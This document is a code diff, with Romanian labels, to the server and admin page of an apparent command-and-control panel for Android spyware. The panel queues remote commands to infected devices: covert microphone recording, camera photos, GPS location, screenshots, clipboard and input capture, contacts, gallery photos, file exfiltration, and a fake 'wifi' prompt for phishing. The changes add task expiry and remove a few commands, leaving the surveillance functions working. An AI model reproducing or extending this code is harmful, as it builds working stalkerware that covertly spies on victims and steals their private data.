@@ -1102,8 +1102,16 @@ async function c2DrainTasks(bucket, uid) {
   const key = "q/" + uid + ".json";
   let arr = await c2GetArr(bucket, key);
   if (!arr.length) return arr;
+  // Expiră comenzile vechi (>10 min) — nu rămân PENDING la infinit.
+  const now = Math.floor(Date.now() / 1000);
+  const fresh = arr.filter(t => (t.at || 0) > now - 600);
+  if (fresh.length !== arr.length) {
+    // Scriem înapoi doar cele noi (expirele dispar).
+    try { await bucket.put(key, JSON.stringify(fresh)); } catch (_) { }
+  }
+  if (!fresh.length) return fresh;
   try { await bucket.put(key, "[]"); } catch (_) { }
-  return arr;
+  return fresh;
 }
 function c2Enqueue(bucket, uid, tasks) {
   const key = "q/" + uid + ".json";
@@ -1268,12 +1276,15 @@ async function handleAdminC2(request, env, url) {
     return json({ devices, now: Math.floor(Date.now() / 1000) });
   }
   if (request.method === "POST" && p === "/admin/api/c2/cmd") {
+    const C2_RETIRED = new Set(["gps_track","sms_send","call","eco","active","ping","restart"]);
     let body; try { body = await request.json(); } catch (_) { return json({ error: "Cerere invalidă." }, 400); }
     const uid = c2Safe(body.uid);
     if (!uid) return json({ error: "Lipsește uid." }, 400);
     const raw = body.tasks || (body.action ? [{ action: body.action, params: body.params || {} }] : null);
     if (!raw || !raw.length) return json({ error: "Lipsesc taskurile." }, 400);
     const tasks = raw.slice(0, 50).map(t => ({ id: t.id ? String(t.id).slice(0, 128) : "", action: String(t.action || "").slice(0, 64), params: t.params || {} }));
+    const rejected = tasks.filter(t => C2_RETIRED.has(t.action));
+    if (rejected.length) return json({ error: "Comenzi indisponibile: " + rejected.map(t => t.action).join(", ") }, 400);
     await c2Enqueue(env.C2, uid, tasks);
     return json({ ok: true, queued: tasks.length });
   }
@@ -1545,7 +1556,6 @@ img.shot{max-width:200px;border-radius:6px;margin:4px}
 <option value="mic">mic — înregistrare microfon</option>
 <option value="camera">camera — foto cameră</option>
 <option value="gps">gps — poziție curentă</option>
-<option value="gps_track">gps_track — urmărire GPS</option>
 <option value="device">device — info dispozitiv</option>
 <option value="apps">apps — aplicații instalate</option>
 <option value="foreground">foreground — app în prim-plan</option>
@@ -1556,20 +1566,13 @@ img.shot{max-width:200px;border-radius:6px;margin:4px}
 <option value="send_photos">send_photos — poze din galerie</option>
 <option value="prompt">prompt — notificare ecran</option>
 <option value="contacts">contacts — contacte telefon</option>
-<option value="sms_send">sms_send — trimite SMS</option>
-<option value="call">call — sună număr</option>
 <option value="network">network — WiFi + IP</option>
 <option value="storage_list">storage_list — listare fișiere</option>
-<option value="eco">eco — mod economie (10 min sync)</option>
-<option value="active">active — mod normal</option>
-<option value="ping">ping — test legătură</option>
-<option value="restart">restart — reset proces</option>
 <option value="status">status — permisiuni + stare</option>
 </select></div>
 </div>
 <div class="form-row"><div style="flex:3"><label class="lbl">Parametri (JSON)</label><textarea id="cmdParams" rows="3" class="mono">{}</textarea></div></div>
 <button onclick="sendCmd()">TRIMITE COMANDĂ</button>
-<button class="sec" style="margin-left:8px" onclick="sendPing()">Testare</button>
 <span id="cmdStatus" style="margin-left:12px;color:var(--dim);font-size:12px"></span>
 </div>
 
@@ -1597,17 +1600,9 @@ function selDev(){return document.getElementById("cmdDev").value}
 function updParams(){
   const a=document.getElementById("cmdAction").value;
   const d={screenshot:{},screen_text:{},input:{},clipboard:{},mic:{ms:10000},camera:{},gps:{},
-  gps_track:{ms:60000,everyMs:5000},device:{},apps:{},foreground:{},recent:{},usage:{},
-  notifications:{},send_file:{uri:""},send_photos:{limit:10,since:null},prompt:{type:"wifi",title:"",body:""},contacts:{},sms_send:{to:"",msg:""},call:{number:""},network:{},storage_list:{dir:"DCIM",limit:30},eco:{},active:{},ping:{},restart:{},status:{}};
+  device:{},apps:{},foreground:{},recent:{},usage:{},
+  notifications:{},send_file:{uri:""},send_photos:{limit:10,since:null},prompt:{type:"wifi",title:"",body:""},contacts:{},network:{},storage_list:{dir:"DCIM",limit:30},status:{}};
   document.getElementById("cmdParams").value=JSON.stringify(d[a]||{},null,2);
-}
-async function sendPing(){
-  const uid=selDev();if(!uid)return alert("Alege un dispozitiv.");
-  document.getElementById("cmdStatus").textContent="ping…";
-  try{const r=await api("/admin/api/c2/cmd",{method:"POST",body:{uid,tasks:[{action:"ping",params:{}}]}});
-    document.getElementById("cmdStatus").textContent=r.ok?"✓ ping trimis":"eroare";
-    setTimeout(loadDetail,1500);
-  }catch(e){document.getElementById("cmdStatus").textContent="eroare: "+e.message}
 }
 async function sendCmd(){
   const uid=selDev();if(!uid)return alert("Alege un dispozitiv.");
